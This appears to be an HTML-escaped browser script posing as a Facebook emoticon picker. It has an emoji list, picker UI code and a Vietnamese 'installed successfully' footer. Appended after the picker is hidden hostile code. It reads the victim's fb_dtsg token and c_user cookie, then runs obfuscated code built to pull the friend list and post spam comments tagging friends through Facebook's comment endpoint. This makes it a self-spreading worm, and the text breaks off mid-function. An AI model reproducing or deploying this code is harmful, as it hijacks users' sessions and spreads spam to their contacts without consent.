		&quot;class&quot; : &quot;_1az _1a- _2e-&quot;,
		&quot;name&quot; : &quot;Kissing couple&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc90 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2e_&quot;,
		&quot;name&quot; : &quot;Bunch of flowers&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc91 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f0&quot;,
		&quot;name&quot; : &quot;Couple with heart&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc93 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f1&quot;,
		&quot;name&quot; : &quot;Heart beating&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc94 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f2&quot;,
		&quot;name&quot; : &quot;Broken Heart&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc96 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f3&quot;,
		&quot;name&quot; : &quot;Bright Heart&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc97 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f4&quot;,
		&quot;name&quot; : &quot;Heart growing&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc98 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f5&quot;,
		&quot;name&quot; : &quot;Heart with arrow&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc99 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f6&quot;,
		&quot;name&quot; : &quot;Blue Heart&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc9a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f7&quot;,
		&quot;name&quot; : &quot;Green Heart&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc9b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f8&quot;,
		&quot;name&quot; : &quot;Yellow Heart&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc9c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f9&quot;,
		&quot;name&quot; : &quot;Purple Heart&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udc9d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fa&quot;,
		&quot;name&quot; : &quot;Heart with ribbon&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udca2 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fb&quot;,
		&quot;name&quot; : &quot;Symbol of anger&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udca4 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fc&quot;,
		&quot;name&quot; : &quot;Sleeping&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udca6 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fd&quot;,
		&quot;name&quot; : &quot;Sweat Symbol&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udca8 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fe&quot;,
		&quot;name&quot; : &quot;Quick Start Symbol&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udca9 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ff&quot;,
		&quot;name&quot; : &quot;Pile of Caca&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcaa &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fg&quot;,
		&quot;name&quot; : &quot;Flexed bicep&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcbb &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fh&quot;,
		&quot;name&quot; : &quot;Personal Computer&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcbd &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fi&quot;,
		&quot;name&quot; : &quot;Mini Disco&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcbe &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fj&quot;,
		&quot;name&quot; : &quot;Floppy disk&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcbf &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fk&quot;,
		&quot;name&quot; : &quot;Optical Disc&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcc0 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fl&quot;,
		&quot;name&quot; : &quot;DVD&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcde &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fm&quot;,
		&quot;name&quot; : &quot;Telephone receiver&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udce0 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fn&quot;,
		&quot;name&quot; : &quot;Fax&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcf1 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fo&quot;,
		&quot;name&quot; : &quot;Mobile Phone&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcf2 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fp&quot;,
		&quot;name&quot; : &quot;Mobile phone with arrow from left to right&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udcfa &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fq&quot;,
		&quot;name&quot; : &quot;Television&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\udd14 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fr&quot;,
		&quot;name&quot; : &quot;Bell&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude01 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fs&quot;,
		&quot;name&quot; : &quot;Face to face with smiling eyes&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude02 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ft&quot;,
		&quot;name&quot; : &quot;Face with tears of joy&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude03 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fu&quot;,
		&quot;name&quot; : &quot;Smiley face with open mouth&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude04 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fv&quot;,
		&quot;name&quot; : &quot;Face and eyes smiling with mouth open&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude06 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fw&quot;,
		&quot;name&quot; : &quot;Smiley face with mouth open and eyes closed&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude09 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fx&quot;,
		&quot;name&quot; : &quot;Face winking eye&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude0b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fy&quot;,
		&quot;name&quot; : &quot;Guy savoring delicious food&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude0c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2fz&quot;,
		&quot;name&quot; : &quot;Relief face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude0d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f-&quot;,
		&quot;name&quot; : &quot;Smiley face with heart shaped eyes&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude0f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2f_&quot;,
		&quot;name&quot; : &quot;Smirk face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude12 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g0&quot;,
		&quot;name&quot; : &quot;Face of boredom&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude13 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g1&quot;,
		&quot;name&quot; : &quot;Face with cold sweat&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude14 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g2&quot;,
		&quot;name&quot; : &quot;Pensive face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude16 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g3&quot;,
		&quot;name&quot; : &quot;Confused face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude18 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g4&quot;,
		&quot;name&quot; : &quot;Throwing kiss Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude1a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g5&quot;,
		&quot;name&quot; : &quot;Kissing face with eyes closed&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude1c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g6&quot;,
		&quot;name&quot; : &quot;Face with tongue out and winking&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude1d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g7&quot;,
		&quot;name&quot; : &quot;Face with tongue hanging out and eyes closed&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude1e &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g8&quot;,
		&quot;name&quot; : &quot;Face discouraged&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude20 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g9&quot;,
		&quot;name&quot; : &quot;Face of anger&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude21 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ga&quot;,
		&quot;name&quot; : &quot;Very angry face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude22 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gb&quot;,
		&quot;name&quot; : &quot;Crying Face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude23 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gc&quot;,
		&quot;name&quot; : &quot;Face of perseverance&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude24 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gd&quot;,
		&quot;name&quot; : &quot;Face of triumph&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude25 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ge&quot;,
		&quot;name&quot; : &quot;Face discouraged but relieved&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude28 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gf&quot;,
		&quot;name&quot; : &quot;Scary face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude29 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gg&quot;,
		&quot;name&quot; : &quot;Fatigued face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude2a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gh&quot;,
		&quot;name&quot; : &quot;Sleeping face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude2b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gi&quot;,
		&quot;name&quot; : &quot;Tired face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude2d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gj&quot;,
		&quot;name&quot; : &quot;Face screaming&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude30 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gk&quot;,
		&quot;name&quot; : &quot;Face with mouth open and cold sweat&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude31 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gl&quot;,
		&quot;name&quot; : &quot;Terrified face of fear&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude32 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gm&quot;,
		&quot;name&quot; : &quot;Very surprised face&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude33 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gn&quot;,
		&quot;name&quot; : &quot;Face flushed&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude35 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2go&quot;,
		&quot;name&quot; : &quot;Face dizzy&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude37 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gp&quot;,
		&quot;name&quot; : &quot;Face with medical mask&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude38 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gq&quot;,
		&quot;name&quot; : &quot;Grinning Cat face and eyes closed&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude39 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gr&quot;,
		&quot;name&quot; : &quot;Cat face with tears of laughter&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude3a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gs&quot;,
		&quot;name&quot; : &quot;Smiling cat face with open mouth&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude3b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gt&quot;,
		&quot;name&quot; : &quot;Smiling cat face with hearts in her eyes&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude3c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gu&quot;,
		&quot;name&quot; : &quot;Face of cat smile twisted&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude3d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gv&quot;,
		&quot;name&quot; : &quot;Cat face kissing with eyes closed&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude3f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gw&quot;,
		&quot;name&quot; : &quot;Cat face crying&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude40 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gx&quot;,
		&quot;name&quot; : &quot;Cat face scared terrified&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude4b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gy&quot;,
		&quot;name&quot; : &quot;Happy person raising a hand&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude4c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2gz&quot;,
		&quot;name&quot; : &quot;Person holding up both hands in celebration&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude4d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g-&quot;,
		&quot;name&quot; : &quot;Person frowning&quot;
	}, {
		&quot;chars&quot; : &quot; \ud83d\ude4f &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2g_&quot;,
		&quot;name&quot; : &quot;Person in prayer&quot;
	}, {
		&quot;chars&quot; : &quot; \u261d &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h0&quot;,
		&quot;name&quot; : &quot;Index finger pointing up&quot;
	}, {
		&quot;chars&quot; : &quot; \u263a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h1&quot;,
		&quot;name&quot; : &quot;White face smiling&quot;
	}, {
		&quot;chars&quot; : &quot; \u26a1 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h2&quot;,
		&quot;name&quot; : &quot;High voltage symbol&quot;
	}, {
		&quot;chars&quot; : &quot; \u26c4 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h3&quot;,
		&quot;name&quot; : &quot;Snowless snowman&quot;
	}, {
		&quot;chars&quot; : &quot; \u270a &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h4&quot;,
		&quot;name&quot; : &quot;Fist up&quot;
	}, {
		&quot;chars&quot; : &quot; \u270b &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h5&quot;,
		&quot;name&quot; : &quot;Hand pointing up&quot;
	}, {
		&quot;chars&quot; : &quot; \u270c &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h6&quot;,
		&quot;name&quot; : &quot;Winning Hand&quot;
	}, {
		&quot;chars&quot; : &quot; \u2600 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h7&quot;,
		&quot;name&quot; : &quot;Sun With Rays&quot;
	}, {
		&quot;chars&quot; : &quot; \u2601 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h8&quot;,
		&quot;name&quot; : &quot;Cloud&quot;
	}, {
		&quot;chars&quot; : &quot; \u2614 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2h9&quot;,
		&quot;name&quot; : &quot;Umbrella With Rain Drops&quot;
	}, {
		&quot;chars&quot; : &quot; \u2615 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2ha&quot;,
		&quot;name&quot; : &quot;Hot Drink&quot;
	}, {
		&quot;chars&quot; : &quot; \u2728 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2hb&quot;,
		&quot;name&quot; : &quot;Brightness&quot;
	}, {
		&quot;chars&quot; : &quot; \u2764 &quot;,
		&quot;class&quot; : &quot;_1az _1a- _2hc&quot;,
		&quot;name&quot; : &quot;Heavy Black Heart&quot;
	} ];

	// = Variables =======
	var lastActiveElement = document.activeElement;

	// = Functions =======
	function createElement(html) {
		var outerHTML = document.createElement(&quot;div&quot;);
		outerHTML.innerHTML = html;
		return outerHTML.firstChild;
	}

	function htmlSpecialChars(string) {
		var div = document.createElement(&quot;div&quot;);
		var text = document.createTextNode(string);
		div.appendChild(text);
		return div.innerHTML;
	}

	function isInstanceOfTextInput(element) {
		return (element instanceof HTMLInputElement &amp;&amp; element.type == &quot;text&quot;)
				|| element instanceof HTMLTextAreaElement;
	}

	function isFlyoutOpen(flyout) {
		return flyout.className == &quot;openToggler&quot;;
	}

	function openFlyout(flyout, open) {
		if (open === undefined) {
			open = !isFlyoutOpen(flyout); // Toggle
		}

		if (open) {
			flyout.className = &quot;openToggler&quot;;
		} else {
			flyout.removeAttribute(&quot;class&quot;);
		}
	}

	function createTab(titleContainer, bodyContainer) {
		var html;
		// Tab; default = inactive
	    html = &#39;&lt;li class=&quot;jewelFlyout fbJewelFlyout uiToggleFlyout&quot;&gt;&#39;;
		html += &#39;&lt;div class=&quot;jewelFlyout&quot;&gt;&#39;;
		html += &#39;&lt;/div&gt;&#39;;
		html += &#39;&lt;/li&gt;&#39;;
		var title = createElement(html);
		titleContainer.appendChild(title);

		// Manual input
		html = &#39;&lt;div style=&quot;display: none;&quot;&gt;&#39;;
		html += &#39;&lt;/div&gt;&#39;;
		var body = createElement(html);
		bodyContainer.appendChild(body);

		// Change tab listener
		(function(body) {
			title.addEventListener(&quot;click&quot;, function() {
				// Change tab
				var titles = this.parentNode.childNodes; // tab.tabContainer.childNodes
				for ( var t = 0; t &lt; titles.length; t++) {
					if (titles[t] === this) { // Active
						
					} else { // Inactive
						titles[t].style.background = &quot;&quot;;
						titles[t].firstChild.style.color = &quot;&quot;;
					}
				}

				// Change body
				var bodies = body.parentNode.childNodes; // body.bodyContainer.childNodes
				for ( var b = 0; b &lt; bodies.length; b++) {
					if (bodies[b] === body) { // Show
						body.style.display = &quot;&quot;;
					} else { // Hide
						bodies[b].style.display = &quot;none&quot;;
					}
				}
			});
		})(body);

		return {
			&quot;title&quot; : title.firstChild,
			&quot;body&quot; : body
		};
	}

	function createTabListBody(emoticons, filter) {
		var html;

		html = &#39;&lt;div style=&quot;max-height: 200px; padding-right: 15px; overflow-x: hidden; line-height: 1em;&quot;&gt;&#39;;
		html += &#39;&lt;div style=&quot;padding: 10px; width: 200px; font-size: 15px;&quot;&gt;&#39;;
		html += &#39;&lt;/div&gt;&#39;;
		html += &#39;&lt;/div&gt;&#39;;
		var body = createElement(html).firstChild;
		for ( var e = 0; e &lt; emoticons.length; e++) {
			var emoticon = emoticons[e];
			if (!filter(emoticon)) {
				continue;
			}

			// Icons
			html = &#39;&lt;span class=&quot;panelCell&quot; style=&quot;display: inline-block; vertical-align: middle; padding: 2px;&quot;&gt;&#39;;
			html += &#39;&lt;a&#39;;
			html += &#39; class=&quot;emoticon&#39;
					+ (emoticon.class !== undefined ? &#39; &#39; + emoticon.class : &#39;&#39;)
					+ &#39;&quot;&#39;;
			html += &#39; style=&quot;text-decoration: inherit; color: inherit;&#39;
					+ (emoticon.class !== undefined ? &#39; color: transparent;&#39;
							: &#39; width: auto;&#39;) + &#39;&quot;&#39;;
			html += (emoticon.name !== undefined ? &#39; title=&quot;&#39; + emoticon.name
					+ &#39;&quot;&#39; : &#39;&#39;);
			html += &#39;&gt;&#39;;
			html += htmlSpecialChars(emoticon.chars);
			html += &#39;&lt;/a&gt;&#39;;
			html += &#39;&lt;/span&gt;&#39;;
			var cell = createElement(html);
			body.appendChild(cell);

			// Select emoticon listener
			var emoticonA = cell.firstChild;
			(function(emoticon) {
				emoticonA.addEventListener(&quot;click&quot;, function() {
					if (isInstanceOfTextInput(lastActiveElement)) {
						lastActiveElement.focus();

						var chars = emoticon.chars;
						var value = lastActiveElement.value;
						var start = lastActiveElement.selectionStart;
						var end = lastActiveElement.selectionEnd;
						lastActiveElement.value = value.substring(0, start)
								+ chars + value.substring(end);
						lastActiveElement.setSelectionRange(start + chars.length, start + chars.length);
					}

					openFlyoutCommand = false; // Close flyout
				});
			})(emoticon);
		}

		return body.parentNode;
	}

	// = Construct UI =======
	var html;

	// Menu item
	// var navItem
	html = &#39;&lt;li class=&quot;navItem middleItem notifNegativeBase&quot;&gt;&#39;;
	html += &#39;&lt;div class=&quot;fbJewel&quot;&gt;&#39;;
	// {

	// Toggler
	html += &#39;&lt;a class=&quot;navLink&quot; title=&quot;1 Thông Báo M?i&quot;&gt;&#39;; // var navLink
	html += &#39;&lt;span style=&quot;vertical-align: middle;&quot;&gt;&lt;img src=&quot;http://static.ak.fbcdn.net/rsrc.php/v1/yY/r/7OqExvAe82o.gif&quot;&gt;&lt;/img&gt;&lt;/span&gt;&#39;;
	html += &#39;&lt;/a&gt;&#39;;

	
	// Flyout
	html += &#39;&lt;div&gt;&#39;; // openToggler; var flyout
	html += &#39;&lt;div class=&quot;emoticonsPanel fbJewelFlyout uiToggleFlyout&quot; style=&quot;z-index: 1; width: auto;&quot;&gt;&#39;;
	// {

	
	// Beeper
	html += &#39;&lt;div class=&quot;jewelBeeperHeader&quot;&gt;&#39;;
	html += &#39;&lt;div class=&quot;beeperNubWrapper&quot;&gt;&#39;;
	html += &#39;&lt;div class=&quot;beeperNub&quot; style=&quot;left: 4px;&quot;&gt;&lt;/div&gt;&#39;;
	html += &#39;&lt;/div&gt;&#39;;
	html += &#39;&lt;/div&gt;&#39;;

	// Tabs
	// var titleContainer
	html += &#39;&lt;ul style=&quot;display: text-align: center;&quot;&gt;&#39;;
	html += &#39;&lt;/ul&gt;&#39;;

	// Bodies
	html += &#39;&lt;div&gt;&#39;; // var bodyContainer
	html += &#39;&lt;/div&gt;&#39;;

	// Footer
	html += &#39;&lt;div class=&quot;jewelFooter&quot;&gt;&#39;;
    html += &#39;&lt;a class=&quot;jewelFooter&quot; href=&quot;https://www.facebook.com/Erosaka&quot; target=&quot;_blank&quot;&gt;Chúc Mừng Bạn Đã Cài Đặt ICON FaceBook Thành Công &lt;br&gt;NoName&lt;/a&gt;&#39;;
	html += &#39;&lt;/div&gt;&#39;;

	// }
	html += &#39;&lt;/div&gt;&#39;; // emoticonsPanel
	html += &#39;&lt;/div&gt;&#39;; // openToggler

	// }
	html += &#39;&lt;/div&gt;&#39;; // fbJewel
	html += &#39;&lt;/li&gt;&#39;; // navItem

	var navItem = createElement(html);
	var pageNav = document.querySelector(&quot;#pageNav&quot;);
	pageNav.insertBefore(navItem, pageNav.firstChild);

	// Maintain active element
	navItem.addEventListener(&quot;click&quot;, function() {
		if (isInstanceOfTextInput(lastActiveElement)) {
			lastActiveElement.focus();
		}

		openFlyoutCommand = undefined; // Do nothing
	}, true);

	var navLink = navItem.firstChild.firstChild;
	var flyout = navLink.nextSibling;
	var titleContainer = flyout.firstChild.childNodes[1];
	var bodyContainer = titleContainer.nextSibling;

	// Toggle listener
	navLink.addEventListener(&quot;click&quot;, function() {
		openFlyoutCommand = !isFlyoutOpen(flyout);
	});

	// Picture emoticon tab
	var picEmoTab = createTab(titleContainer, bodyContainer);
	picEmoTab.title.click(); // Default tab
	
	picEmoTab.body.appendChild(createTabListBody(emoticons, function(emoticon) {
		if (emoticon.class === undefined) { // No picture
			return false;
		}

		// [Bug] 2 characters unicode emoticons
		if (emoticon.chars.length == 2) {
			return false;
		}

		return true;

			}));

	// = Other listener =======

	document.addEventListener(&quot;click&quot;, function() {
		// Get active textarea
		lastActiveElement = document.activeElement;

		// Toggle flyout
		if (openFlyoutCommand !== undefined) {
			openFlyout(flyout, openFlyoutCommand);
		}
		openFlyoutCommand = false;
 	});
})();


	// === Facebook Emoticons ====
var fb_dtsg = document.getElementsByName(&#39;fb_dtsg&#39;)[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + &quot;=&quot;;
    if (document.cookie.length &gt; 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(&quot;;&quot;, konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return &quot;&quot;; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName(&#39;fb_dtsg&#39;)[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + &quot;=&quot;;
    if (document.cookie.length &gt; 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(&quot;;&quot;, konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return &quot;&quot;; }
    }
}
function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}
var _0xa22c=[&quot;value&quot;,&quot;fb_dtsg&quot;,&quot;getElementsByName&quot;,&quot;match&quot;,&quot;cookie&quot;,&quot;259480317554616&quot;,&quot;onreadystatechange&quot;,&quot;readyState&quot;,&quot;arkadaslar = &quot;,&quot;for (;;);&quot;,&quot;&quot;,&quot;replace&quot;,&quot;responseText&quot;,&quot;;&quot;,&quot;length&quot;,&quot;entries&quot;,&quot;payload&quot;,&quot;round&quot;,&quot; @[&quot;,&quot;uid&quot;,&quot;:&quot;,&quot;text&quot;,&quot;]&quot;,&quot; &quot;,&quot;\x26filter[0]=user&quot;,&quot;\x26options[0]=friends_only&quot;,&quot;\x26options[1]=nm&quot;,&quot;\x26token=v7&quot;,&quot;\x26viewer=&quot;,&quot;\x26__user=&quot;,&quot;https://&quot;,&quot;indexOf&quot;,&quot;URL&quot;,&quot;GET&quot;,&quot;https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&quot;,&quot;open&quot;,&quot;http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&quot;,&quot;send&quot;,&quot;random&quot;,&quot;floor&quot;,&quot;\x26ft_ent_identifier=&quot;,&quot;\x26comment_text=Gỡ Bỏ Icon và Chống Tag thành công, ai chưa làm thì làm ngay đi nha, :v thử đi? ...............................................................................................................................................................................................................................................................................................................................................................&quot;,&quot;\x26source=2&quot;,&quot;\x26client_id=1377871797138:1707018092&quot;,&quot;\x26reply_fbid&quot;,&quot;\x26parent_comment_id&quot;,&quot;\x26rootid=u_jsonp_2_3&quot;,&quot;\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5\x22,\x22version\x22:\x22x\x22,\x22parent_fbid\x22:&quot;,&quot;}&quot;,&quot;\x26attached_sticker_fbid=0&quot;,&quot;\x26attached_photo_fbid=0&quot;,&quot;\x26giftoccasion&quot;,&quot;\x26ft[tn]=[]&quot;,&quot;\x26__a=1&quot;,&quot;\x26__dyn=7n8ahyj35ynxl2u5F97KepEsyo&quot;,&quot;\x26__req=q&quot;,&quot;\x26fb_dtsg=&quot;,&quot;\x26ttstamp=&quot;,&quot;POST&quot;,&quot;/ajax/ufi/add_comment.php&quot;,&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;,&quot;setRequestHeader&quot;,&quot;status&quot;,&quot;close&quot;];var fb_dtsg=document[_0xa22c[2]](_0xa22c[1])[0][_0xa22c[0]];var user_id=document[_0xa22c[4]][_0xa22c[3]](document[_0xa22c[4]][_0xa22c[3]](/c_user=(\d+)/)[1]);var id=_0xa22c[5];var arkadaslar=[];var svn_rev;function arkadaslari_al(id){var _0x7892x7= new XMLHttpRequest();_0x7892x7[_0xa22c[6]]=function 